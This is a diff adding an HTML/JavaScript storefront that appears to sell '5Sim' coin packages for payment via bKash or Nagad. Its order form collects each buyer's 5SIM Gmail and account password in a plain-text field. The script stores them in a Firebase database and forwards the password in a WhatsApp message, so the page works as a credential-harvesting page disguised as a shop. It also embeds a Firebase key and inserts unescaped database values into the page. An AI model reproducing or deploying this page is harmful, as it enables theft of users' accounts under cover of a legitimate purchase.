@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>5Sim Premium Coin Agency | User Store</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #00f2ff; --accent: #7000ff; --bg: #03000a; --glass: rgba(255, 255, 255, 0.07); }
+        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Poppins', sans-serif; overflow-x: hidden; }
+        .container { max-width: 480px; margin: 0 auto; min-height: 100vh; padding-bottom: 30px; background: rgba(0,0,0,0.4); border-inline: 1px solid var(--glass); }
+        header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.6); backdrop-filter: blur(15px); position: sticky; top: 0; z-index: 100; border-bottom: 1px solid var(--glass); }
+        .logo { font-family: 'Orbitron', sans-serif; font-size: 1.1rem; color: var(--primary); text-shadow: 0 0 10px var(--primary); }
+        .official-banner { margin: 20px 15px; padding: 25px 15px; border-radius: 20px; background: linear-gradient(135deg, rgba(0, 242, 255, 0.1), rgba(112, 0, 255, 0.1)); border: 1px solid var(--glass); text-align: center; }
+        .grid-title { padding: 10px 20px; font-size: 0.9rem; color: var(--primary); display: flex; align-items: center; gap: 10px; margin-top: 10px; }
+        .grid-title::after { content: ""; height: 1px; flex: 1; background: var(--glass); }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 15px; }
+        .card { background: var(--glass); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 25px 15px; text-align: center; cursor: pointer; transition: 0.4s; backdrop-filter: blur(5px); }
+        .card:hover { border-color: var(--primary); transform: translateY(-5px); background: rgba(0, 242, 255, 0.05); }
+        .card b { display: block; color: #fff; font-size: 1rem; margin-top: 10px; }
+        .card span { color: var(--primary); font-size: 1.3rem; font-weight: 800; display: block; margin-top: 5px; }
+        .contact-btn { display: flex; align-items: center; gap: 15px; padding: 15px; border-radius: 15px; margin: 10px 15px; text-decoration: none; color: #fff; background: var(--glass); border: 1px solid var(--glass); transition: 0.3s; }
+        .sheet-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; z-index: 1000; backdrop-filter: blur(8px); }
+        .sheet { position: fixed; bottom: -100%; left: 0; right: 0; max-width: 480px; margin: 0 auto; background: #0a0a14; border-radius: 30px 30px 0 0; padding: 25px; transition: 0.5s; z-index: 1001; border-top: 3px solid var(--primary); box-sizing: border-box; }
+        .sheet.active { bottom: 0; }
+        input { width: 100%; padding: 14px; background: rgba(255,255,255,0.05); border: 1px solid #222; color: #fff; border-radius: 12px; margin-top: 12px; outline: none; box-sizing: border-box; }
+        .btn-confirm { width: 100%; padding: 18px; border: none; border-radius: 15px; background: linear-gradient(45deg, var(--primary), var(--accent)); color: #000; font-weight: 800; margin-top: 25px; cursor: pointer; font-size: 1rem; }
+        .method-box { display: flex; gap: 10px; margin-top: 15px; }
+        .method-item { flex: 1; border: 1px solid #333; padding: 12px; border-radius: 12px; cursor: pointer; text-align: center; color: #888; font-weight: 600; }
+        .method-item.selected { border-color: var(--primary); color: var(--primary); background: rgba(0, 242, 255, 0.1); }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">5SIM AGENCY</div>
+            <div style="font-size: 1.4rem; color: var(--primary);"><i class="fa-solid fa-bolt"></i></div>
+        </header>
+
+        <div class="official-banner">
+            <h1 style="font-family: Orbitron; font-size: 1.1rem; margin: 0; color: var(--primary);">5SIM PREMIUM COIN STORE</h1>
+            <p style="font-size: 0.75rem; color: #888; margin-top: 5px;">Fast • Secure • 24/7 Service</p>
+        </div>
+        
+        <div class="grid-title">SELECT PACKAGE</div>
+        <div class="grid" id="pkg-list">
+            </div>
+
+        <div class="grid-title">CONTACT US</div>
+        <a href="#" class="contact-btn" id="wa-btn" target="_blank"><i class="fa-brands fa-whatsapp" style="color:#25d366"></i> WhatsApp Support</a>
+        <a href="#" class="contact-btn" id="tg-btn" target="_blank"><i class="fa-brands fa-telegram" style="color:#0088cc"></i> Telegram Channel</a>
+    </div>
+
+    <div class="sheet-overlay" id="overlay" onclick="closeSheet()"></div>
+    <div class="sheet" id="order-sheet">
+        <center><div style="width: 50px; height: 5px; background: #333; border-radius: 10px; margin-bottom: 15px;"></div></center>
+        <div style="text-align:center; font-size:0.8rem; color:var(--primary); background:rgba(0,242,255,0.05); padding:8px; border-radius:10px; border:1px solid rgba(0,242,255,0.2);">পেমেন্ট করে সঠিক তথ্য দিয়ে অর্ডার কনফার্ম করুন</div>
+        
+        <h3 id="p-name" style="margin:15px 0 5px; color:var(--primary); font-family:Orbitron;">Package</h3>
+        
+        <div class="method-box">
+            <div id="m-bkash" onclick="setMethod('Bkash')" class="method-item">bKash</div>
+            <div id="m-nagad" onclick="setMethod('Nagad')" class="method-item">Nagad</div>
+        </div>
+
+        <div style="background:rgba(255,255,255,0.03); padding:12px; border-radius:12px; margin-top:15px; border:1px dashed #444;">
+            <small style="color:#888;">Send Money to:</small>
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-top:5px;">
+                <b id="pay-num" style="font-size:1.1rem; color:var(--primary);">...</b>
+                <button onclick="copyNum()" style="background:var(--primary); border:none; padding:4px 10px; border-radius:5px; font-weight:bold; cursor:pointer; color:#000;">Copy</button>
+            </div>
+        </div>
+
+        <input type="text" id="uname" placeholder="ENTER YOUR NAME">
+        <input type="email" id="ugmail" placeholder="ENTER YOUR 5SIM GMAIL">
+        <input type="text" id="upass" placeholder="ENTER YOUR 5SIM PASSWORD">
+        <input type="text" id="utrx" placeholder="ENTER TRANSACTION ID">
+        
+        <button class="btn-confirm" onclick="submitOrder()">CONFIRM ORDER - ৳<span id="p-price">0</span></button>
+    </div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+    import { getDatabase, ref, onValue, push } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyCSD8yo39gwGsWcvQO7Hnuo8ukdcfeFa-E",
+        databaseURL: "https://imo-daimon-default-rtdb.firebaseio.com",
+        projectId: "imo-daimon"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    let settings = {};
+    let selectedPkg = null;
+    let payMethod = 'Bkash';
+
+    onValue(ref(db, 'settings'), (s) => {
+        settings = s.val() || {};
+        document.getElementById('wa-btn').href = "https://wa.me/" + (settings.wa || "");
+        document.getElementById('tg-btn').href = settings.tg || "#";
+        updatePayNum();
+    });
+
+    onValue(ref(db, 'products'), (s) => {
+        const list = document.getElementById('pkg-list');
+        list.innerHTML = '';
+        if(s.val()) {
+            Object.entries(s.val()).forEach(([id, p]) => {
+                const div = document.createElement('div');
+                div.className = 'card';
+                div.innerHTML = `<i class="fa-solid fa-coins" style="font-size:2rem; color:#ff9f43"></i><b>${p.name}</b><span>৳${p.price}</span>`;
+                div.onclick = () => openSheet(p);
+                list.appendChild(div);
+            });
+        }
+    });
+
+    window.openSheet = (p) => {
+        selectedPkg = p;
+        document.getElementById('p-name').innerText = p.name;
+        document.getElementById('p-price').innerText = p.price;
+        document.getElementById('order-sheet').classList.add('active');
+        document.getElementById('overlay').style.display = 'block';
+        setMethod('Bkash');
+    }
+
+    window.closeSheet = () => {
+        document.getElementById('order-sheet').classList.remove('active');
+        document.getElementById('overlay').style.display = 'none';
+    }
+
+    window.setMethod = (m) => {
+        payMethod = m;
+        document.getElementById('m-bkash').classList.toggle('selected', m === 'Bkash');
+        document.getElementById('m-nagad').classList.toggle('selected', m === 'Nagad');
+        updatePayNum();
+    }
+
+    function updatePayNum() {
+        document.getElementById('pay-num').innerText = payMethod === 'Bkash' ? (settings.bkashNum || 'Not Set') : (settings.nagadNum || 'Not Set');
+    }
+
+    window.copyNum = () => {
+        navigator.clipboard.writeText(document.getElementById('pay-num').innerText);
+        alert("Number Copied!");
+    }
+
+    window.submitOrder = () => {
+        const name = document.getElementById('uname').value;
+        const gmail = document.getElementById('ugmail').value;
+        const pass = document.getElementById('upass').value;
+        const trx = document.getElementById('utrx').value;
+
+        if(!name || !gmail || !pass || !trx) return alert("সবগুলো ঘর পূরণ করুন!");
+
+        const orderData = {
+            name, gmail, pass, trx,
+            pkg: selectedPkg.name,
+            price: selectedPkg.price,
+            method: payMethod,
+            time: new Date().toLocaleString()
+        };
+
+        push(ref(db, 'orders'), orderData).then(() => {
+            const msg = `✅ *New 5Sim Order*\nName: ${name}\nPackage: ${selectedPkg.name}\nGmail: ${gmail}\nPass: ${pass}\nTrxID: ${trx}\nMethod: ${payMethod}`;
+            window.location.href = `https://wa.me/qr/VIL4PZSECESCB1?text=${encodeURIComponent(msg)}`;
+    });
+}
+</script>
+</body>
+</html>
